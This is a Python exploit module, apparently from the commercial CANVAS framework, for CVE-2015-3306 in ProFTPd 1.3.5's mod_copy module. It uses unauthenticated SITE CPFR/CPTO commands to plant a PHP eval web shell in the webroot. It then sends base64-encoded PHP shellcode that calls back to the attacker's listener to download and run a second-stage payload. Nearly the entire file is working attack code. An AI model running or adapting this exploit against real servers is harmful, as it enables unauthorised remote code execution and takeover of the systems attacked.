#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import ftplib

if "." not in sys.path: sys.path.append(".")

import canvasengine

import libs.spkproxy as spkproxy

from exploitutils import *
from ExploitTypes.phpexploit import *

NAME                            = "ProFTPd 1.3.5 Remote File Copy"
DESCRIPTION                     = "ProFTPd 1.3.5 Remote File Copy"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = ""
DOCUMENTATION['Date Public']    = "05/18/2015"
DOCUMENTATION["CERT Advisory"]  = "None"
DOCUMENTATION["References"]     = "http://bugs.proftpd.org/show_bug.cgi?id=4169"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["CVE Name"]       = "CVE-2015-3306"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3306"
DOCUMENTATION['CVSS']           = 10
DOCUMENTATION["NOTES"]          = """

This exploit abuses the commands of the mod_copy module in ProFTPd (version<=1.3.5). The SITE CPFR/CPTO commands can be used by unauthenticated clients to copy files from any part of the filesistem to a chosen destination. With these commands the mod_copy module allows remote attackers to read and write local files.
In the first part of the attack, the exploit copy the /proc/self/cmdline to /tmp/ folder with a PHP payload as the filename, then copy this file to the webroot as a PHP file.
The second part of the attack involves making a GET request to the PHP file just created with the PHP shellcode as a parameter. The payload created in the first part will execute the PHP
shellcode

Note about the target:
To exploit this vulnerability, the mod_copy module must be compiled with the ProFTPd's sources.Also we need write privs on the webroot folder we choose (unless the ftp server was started has root).
Then we must assume that the webserver has a PHP module.


This exploit has been tested on:
* Ubuntu 13.04 - Linux 3.8.0-19-generic x64. (Successful exploitation)


Command line usage:
$ ./commandlineInterface.py -l 172.16.135.238 -p5556 -v 7
$ python ./exploits/remote/unix/proftpd_mod_copy/proftpd_mod_copy.py -t 172.16.135.238 -l 172.16.135.1 -d 5556

"""

VERSION             = "1.0"
PROPERTY            = {}
PROPERTY['TYPE']    = "Exploit"
PROPERTY['SITE']    = "Remote"
PROPERTY['ARCH']    = [ ["Linux"] ]
PROPERTY['VERSION'] = [ "All" ]

CHANGELOG = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port = 21
        self.host = ""
        self.shellcode = "\xcc" * 298
        self.badstring = "\x00"
        self.version = 1
        self.done = 0
        self.name = NAME
        self.webroot = "/var/www/"
        self.shell_exec_cmd = False
        self.command = None
        self.webserverport = 80
        self.server = None
        self.phpfilename = "index.php"

        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
        self.webroot = self.argsDict.get("webroot", self.webroot)
        self.webserverport = int(self.argsDict.get("webserverport", self.webserverport))

        return

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def test(self):
        #TODO
        return 1

    def is_vulnerable(self, *args, **kwargs):

        status = False
        result = ""
        try:
            ftpc = ftplib.FTP()
            result = ftpc.connect(self.host,self.port)
        except:
            self.log_error("Connection Refused")
            return False

        # check version
        if "220" in result:
           version = result.split(" ")[2]
           self.log_info("Found version <%s> " % version)
           if "1.3.5" in version:
               status = True

        if status:
            # check if mod_copy module is activated
            result = ftpc.sendcmd("SITE help")
            if "CPFR" in result:
                self.log("Found mod_copy module")
            else:
                status = False

        ftpc.close()
        return status

    def make_php_payload(self):
        #payload = "<?php $a= $_GET[\'id\']; eval(base64_decode($a)); ?>"
        payload = "<?php eval(base64_decode($_GET[\'id\']));?>"
        return payload

    def file_upload(self):
        payload = self.make_php_payload()

        try:
            ftpc = ftplib.FTP()
            ftpc.connect(self.host,self.port)
        except:
            self.log("Connection Refused")
            return False

        try:
            ftpc.voidcmd("SITE cpfr /proc/self/cmdline")
        except ftplib.error_reply as res:
            if "350" not in str(res):
               self.log_error("Can't access /proc/self/cmdline (perhaps a permission issue)")
               return False
        try:
            ftpc.voidcmd("SITE cpto /tmp/..."+payload)
        except ftplib.error_reply as res:
            print str(res)
        except ftplib.error_perm as res:
            if "250" not in str(res):
               self.log_error("Something was wrong: %s" % str(res))
               return False

        try:
            ftpc.voidcmd("SITE cpfr /tmp/..."+payload)
        except ftplib.error_reply as res:
            if "350" not in str(res):
               self.log_error("Something was wrong: %s" % str(res))
               return False
        except ftplib.error_perm as res:
            self.log_error("Something was wrong: %s" % str(res))
            return False

        try:
            ftpc.voidcmd("SITE cpto " + self.webroot + self.phpfilename)
            self.log_info("Copy payload to target")
        except ftplib.error_reply as res:
            print str(res)
        except ftplib.error_perm as res:
            self.log_error("Something was wrong: %s" % str(res))
            self.log_info("Maybe you don't have permissions to write in %s" % self.webroot)
            return False

        self.log("Payload Uploaded")
        self.log("Close connection with FTP server -> %s" % ftpc.quit() )

        return True

    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will
        download and execute MOSDEF
        """
        localhost = self.callback.ip
        localport = self.callback.port

        self.log_info("Using PHPMULTI callback for %s:%d" % (localhost, localport))
        from phplistener import get_php_stage1 #get our "Shellcode"

        badchars = self.badstring
        ret = get_php_stage1(badchars,localhost,localport)
        return ret

    def run_payload(self):
        php_shellcode = self.get_php_to_mosdef()

        # removing the '<?' and '?>' because we are using php's eval() in our payload.
        php_shellcode = php_shellcode.replace("<?","")
        php_shellcode = php_shellcode.replace("?>","")

        # replace double quote for simple quote because I need to used it with php's eval().
        php_shellcode = php_shellcode.replace("\"","'")

        #print repr(php_shellcode)
        #print php_shellcode

        enc_shellcode = b64encode(php_shellcode).strip()

        sreq = 'http://%s:%s/%s?id=%s' % (self.host,self.webserverport,self.phpfilename,enc_shellcode)
        self.log_info("Request: " + sreq)

        try:
            # don't wait for the result
            resp = spkproxy.urlopen(sreq,
                                    verb = "GET",
                                    hostname = self.host,
                                    exploit = self,
                                    entireresponse = False,
                                    noresponse = True)

            # If we got an answer it means an error occurred
            if resp:
                if "501" in resp:
                    self.log_error("Connection Error: The web server is down or maybe is listening on a different port")
                    return False
                else:
                    self.log_error("An error occurred while connecting to the webserver - response %s" % str(resp))
                    return False

        except:
            self.log_error("An error occurred while connecting to the webserver")
            raise

        return True

    def run(self):
        self.getargs()

        if not self.is_vulnerable():
           self.log_error("Target is not vulnerable")
           return 0
        else:
           self.log_info("Target might be vulnerable")

        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
        self.log_info("Attacking %s:%d" % (self.host, self.port))

        if not self.file_upload():
            self.log_error("File Upload Failed")
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))
            return 0

        if not self.run_payload():
            self.log_error("Run Payload Failed")
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))
            return 0

        self.setInfo("%s attacking %s:%d - done (success!)" % (NAME, self.host, self.port))
        return 1

    def shutdown(self):
        self.done = 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

